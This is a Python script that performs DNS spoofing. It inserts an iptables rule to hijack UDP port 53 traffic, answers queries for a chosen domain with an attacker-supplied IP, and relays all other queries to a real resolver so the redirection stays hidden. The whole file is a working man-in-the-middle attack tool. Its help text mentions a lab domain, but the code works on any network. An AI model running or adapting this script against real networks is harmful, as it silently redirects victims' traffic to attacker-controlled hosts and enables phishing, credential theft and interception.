import scapy.all as scapy
import os
import sys
import signal
import socket
import threading

# global variable to track the iptables rule
FORWARDER_RULE_ADDED = False
FORWARDER_RUNNING = False


def add_forwarder_iptables():
    """
    Add iptables DNAT rule to redirect DNS queries to our local forwarder.
    This intercepts DNS traffic and sends it to our forwarder on port 5353.
    """
    global FORWARDER_RULE_ADDED
    # redirect DNS queries (destination port 53) to our forwarder on localhost:5353
    ret = os.system("iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null")
    if ret == 0:
        FORWARDER_RULE_ADDED = True
        print("[DNS] Forwarder mode: redirecting DNS to port 5353")
    else:
        print("[DNS] WARNING: Failed to add DNAT rule for forwarder")


def remove_forwarder_iptables():
    """
    Remove the iptables DNAT rule for DNS forwarding.
    """
    global FORWARDER_RULE_ADDED
    if FORWARDER_RULE_ADDED:
        os.system("iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null")
        FORWARDER_RULE_ADDED = False
        print("[DNS] Forwarder DNAT rule removed")


class DNSForwarder:
    """
    A DNS forwarder that:
    - Spoofs responses for the target domain
    - Forwards all other DNS queries to the real DNS server
    
    This eliminates race conditions and allows non-target domains to work normally.
    """
    def __init__(self, target_domain, spoof_ip, real_dns_ip, listen_port=5353):
        self.target_domain = target_domain.lower().rstrip('.') + '.'
        self.spoof_ip = spoof_ip
        self.real_dns_ip = real_dns_ip
        self.listen_port = listen_port
        self.sock = None
        self.running = False
        
    def start(self):
        """Start the DNS forwarder in a background thread."""
        global FORWARDER_RUNNING
        self.running = True
        FORWARDER_RUNNING = True
        thread = threading.Thread(target=self._run_server, daemon=True)
        thread.start()
        print(f"[DNS] Forwarder listening on 0.0.0.0:{self.listen_port}")
        print(f"[DNS] Spoofing: {self.target_domain} → {self.spoof_ip}")
        print(f"[DNS] Forwarding other queries to {self.real_dns_ip}")
        
    def _run_server(self):
        """Internal method to run the UDP server."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind(('0.0.0.0', self.listen_port))
            self.sock.settimeout(1.0)  # allow periodic checking of running flag
            
            while self.running:
                try:
                    data, addr = self.sock.recvfrom(4096)
                    # handle each query in a separate thread to avoid blocking
                    threading.Thread(target=self._handle_query, args=(data, addr), daemon=True).start()
                except socket.timeout:
                    continue  # check if still running
                except Exception as e:
                    if self.running:
                        print(f"[DNS] Server error: {e}")
                        
        except Exception as e:
            print(f"[DNS] Failed to start forwarder: {e}")
        finally:
            if self.sock:
                self.sock.close()
                
    def _handle_query(self, data, addr):
        """Handle a single DNS query."""
        try:
            # parse DNS query using scapy
            dns_packet = scapy.DNS(data)
            
            if not dns_packet.haslayer(scapy.DNSQR):
                return
                
            qname = dns_packet[scapy.DNSQR].qname.decode()
            
            # check if this is the target domain
            if qname.lower() == self.target_domain.lower():
                # create spoofed response
                response = self._create_spoofed_response(dns_packet, qname)
                self.sock.sendto(bytes(response), addr)
                print(f"[DNS] Spoofed: {qname} → {self.spoof_ip}")
            else:
                # forward to real DNS server
                self._forward_query(data, addr, qname)
                
        except Exception as e:
            print(f"[DNS] Query handler error: {e}")
            
    def _create_spoofed_response(self, query, qname):
        """Create a spoofed DNS response for the target domain."""
        response = scapy.DNS(
            id=query.id,
            qr=1,  # response
            aa=1,  # authoritative
            rd=query.rd,  # recursion desired (copy from query)
            ra=1,  # recursion available
            qd=query.qd,  # question section
            an=scapy.DNSRR(
                rrname=qname,
                ttl=10,
                type='A',
                rdata=self.spoof_ip
            )
        )
        return response
        
    def _forward_query(self, data, client_addr, qname):
        """Forward a DNS query to the real DNS server and relay the response."""
        try:
            # create a socket to forward the query
            forward_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            forward_sock.settimeout(3.0)
            
            # send query to real DNS server
            forward_sock.sendto(data, (self.real_dns_ip, 53))
            
            # receive response
            response, _ = forward_sock.recvfrom(4096)
            
            # send response back to client
            self.sock.sendto(response, client_addr)
            print(f"[DNS] Forwarded: {qname}")
            
            forward_sock.close()
            
        except socket.timeout:
            print(f"[DNS] Timeout forwarding: {qname}")
        except Exception as e:
            print(f"[DNS] Forward error for {qname}: {e}")
            
    def stop(self):
        """Stop the DNS forwarder."""
        global FORWARDER_RUNNING
        self.running = False
        FORWARDER_RUNNING = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass


def run_dns_spoof():
    """Run the DNS forwarder that spoofs target domain and forwards other queries."""
    forwarder = None
    try:
        # get configuration from globals (set by argparse)
        target_domain = globals().get("TARGET_DOMAIN")
        redirect_ip = globals().get("REDIRECT_IP")
        dns_server = globals().get("DNS_SERVER")
        
        if not all([target_domain, redirect_ip, dns_server]):
            print("[!] ERROR: Missing required configuration. Use command-line arguments.")
            return
        
        # start the DNS forwarder
        forwarder = DNSForwarder(
            target_domain=target_domain,
            spoof_ip=redirect_ip,
            real_dns_ip=dns_server,
            listen_port=5353
        )
        forwarder.start()
        
        # add iptables rule to redirect DNS traffic to our forwarder
        add_forwarder_iptables()
        
        # keep the main thread alive
        while forwarder.running:
            try:
                signal.pause()
            except KeyboardInterrupt:
                break
        
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[!] ERROR: {e}")
    finally:
        # cleanup
        remove_forwarder_iptables()
        if forwarder:
            forwarder.stop()

if __name__ == "__main__":
    # ensure we handle termination signals to clean up iptables
    def _graceful_shutdown(signum, frame):
        try:
            remove_forwarder_iptables()
        except Exception:
            pass
        sys.exit(0)
    signal.signal(signal.SIGTERM, _graceful_shutdown)
    signal.signal(signal.SIGINT, _graceful_shutdown)
    
    # parse CLI options: domain to spoof and attacker IP
    import argparse
    parser = argparse.ArgumentParser(description="DNS Forwarder - Spoofs target domain, forwards others to real DNS")
    parser.add_argument("--domain", required=True, help="Domain to spoof (include trailing dot, e.g., web1.mylab.test.)")
    parser.add_argument("--attacker-ip", required=True, help="IP address to return for the spoofed domain")
    parser.add_argument("--dns-server", required=True, help="Real DNS server to forward non-target queries to (e.g., 8.8.8.8)")
    parser.add_argument("--iface", required=True, help="Network interface to use (e.g., eth0)")
    args = parser.parse_args()
    target_domain = args.domain
    redirect_ip = args.attacker_ip
    dns_server = args.dns_server
    iface = args.iface
    # set the scapy default iface to the requested one for sending
    scapy.conf.iface = iface
    # expose these as module globals used in process_packet/process_packet_sniff/forwarder
    globals()["TARGET_DOMAIN"] = target_domain
    globals()["REDIRECT_IP"] = redirect_ip
    globals()["DNS_SERVER"] = dns_server
    print(f"Will spoof {target_domain} -> {redirect_ip} on iface {iface}")
    run_dns_spoof()
